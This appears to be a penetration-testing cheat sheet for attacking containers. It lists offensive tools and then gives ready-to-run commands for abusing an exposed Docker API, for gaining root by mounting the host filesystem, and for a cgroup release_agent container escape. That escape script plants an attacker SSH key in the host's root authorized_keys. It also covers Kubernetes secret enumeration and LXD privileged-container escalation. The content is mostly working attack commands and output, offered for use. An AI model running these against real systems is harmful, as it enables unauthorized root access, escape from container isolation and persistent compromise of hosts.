# Container

| Name | Description | URL |
| --- | --- | --- |
| Kubestriker | A Blazing fast Security Auditing tool for Kubernetes. | https://github.com/vchinnipilli/kubestriker |
| deepce | Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE)  | https://github.com/stealthcopter/deepce |
| Peirates | Peirates - Kubernetes Penetration Testing tool | https://github.com/inguardians/peirates |
| Krane | Kubernetes RBAC static analysis & visualisation tool | https://github.com/appvia/krane |
| Harpoon | A collection of scripts, and tips and tricks for hacking k8s clusters and containers. | https://github.com/ProfessionallyEvil/harpoon |
| Bad Pods | A collection of manifests that will create pods with elevated privileges. | https://github.com/BishopFox/badPods |
| ThreatMapper | Open source cloud native security observability platform. Linux, K8s, AWS Fargate and more. | https://github.com/deepfence/ThreatMapper |
| Break out the Box (BOtB) | A container analysis and exploitation tool for pentesters and engineers. | https://github.com/brompwnie/botb |
| Awesome Kubernetes (K8s) Security | A curated list for Kubernetes (K8s) Security resources such as articles, books, tools, talks and videos. | https://github.com/magnologan/awesome-k8s-security |

## Docker

```c
$ docker -H <RHOST>:2375 info
$ docker -H <RHOST>:2375 images
$ docker -H <RHOST>:2375 version
$ docker -H <RHOST>:2375 ps -a
$ docker -H <RHOST>:2375 exec -it 01ca084c69b7 /bin/sh
```

### Privilege Escalation

```c
$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### Attacking Docker API

```c
$ docker -H <RHOST>:2375 ps -a
CONTAINER ID   IMAGE     COMMAND                  CREATED        STATUS                    PORTS     NAMES
01ca084c69b7   alpine    "chroot /host bash -…"   11 hours ago   Exited (2) 11 hours ago             zealous_blackburn
```

```c
$ docker -H <RHOST>:2375 commit 01ca084c69b7
sha256:aa02ba520ac94c2ca87366344c6c6f49d351a4ef05ba65341109cdccf14619ac

Initial CONTAINER ID: 01ca084c69b7
New COMMIT:           aa02ba520ac94c2ca87366344c6c6f49d351a4ef05ba65341109cdccf14619ac
New CONTAINER ID:     aa02ba520ac9
```

```c
$ docker -H <RHOST>:2375 run -it aa02ba520ac9 /bin/sh
/ # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

### Container Escape by exploiting cgroups

#### Requirements

* Already root inside a container
* The container must be run with the SYS_ADMIN Linux capability
* The container must lack an AppArmor profile, or otherwise allow the mount syscall
* The cgroup v1 virtual filesystem must be mounted read-write inside the container

#### Vulnerability Indicator Flag

```c
--security-opt apparmor=unconfined --cap-add=SYS_ADMIN
```

#### Script

```c
mkdir /tmp/exploit && mount -t cgroup -o rdma cgroup /tmp/exploit && mkdir /tmp/exploit/x
echo 1 > /tmp/exploit/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/exploit/release_agent

echo '#!/bin/sh' > /cmd
echo "echo '<SSH_KEY>' > /root/.ssh/authorized_keys" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/exploit/x/cgroup.procs"
```

### Privilege Escalation

```c
$ docker run -v /:/mnt --rm -it ubuntu chroot /mnt sh
```

## Kubernetes

### API RBAC Attack

```c
$ kubectl get namespaces
$ kubectl get pods --all-namespaces -o wide
$ kubectl get pods -n <NAMESPACE>
$ kubectl describe pod <POD_ID> -n <NAMESPACE>
$ kubectl -n <NAMESPACE> --token=<TOKEN> auth can-i --list
$ kubectl get secrets -n <NAMESPACE>
$ kubectl describe secrets/<SECRET> -n <NAMESPACE>
$ kubectl --token=<TOKEN> cluster-info
$ kubectl --token=<TOKEN> auth can-i create pod
$ kubectl create -f <BADPOD>.yaml --token=<TOKEN>
```

## LXD

> https://github.com/saghul/lxd-alpine-builder

### Privilege Escalation

```c
$ sudo ./build-alpine
```

or

```c
$ sudo ./build-alpine -a i686
```

### Configuration

```c
$ lxd init
```

### Settings

```c
Would you like to use LXD clustering? (yes/no) [default=no]:
Do you want to configure a new storage pool? (yes/no) [default=yes]:
Name of the new storage pool [default=default]:
Name of the storage backend to use (dir, lvm, ceph, btrfs) [default=btrfs]: dir
Would you like to connect to a MAAS server? (yes/no) [default=no]:
Would you like to create a new local network bridge? (yes/no) [default=yes]:
What should the new bridge be called? [default=lxdbr0]:
What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]:
What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]:
Would you like LXD to be available over the network? (yes/no) [default=no]:
Would you like stale cached images to be updated automatically? (yes/no) [default=yes]
Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]:
```

### Starting

```c
$ lxc launch ubuntu:18.04
```

### Import

```c
$ lxc image import ./alpine-v3.12-x86_64-20200622_0953.tar.gz --alias foobar
```

### Status

```c
$ lxc image list
```

### Security Parameters

```c
$ lxc init foobar ignite -c security.privileged=true
```

### Set mount Options

```c
$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
```

### Starting Image

```c
$ lxc start ignite
```

### Enter Image

```c
$ lxc exec ignite /bin/sh
```
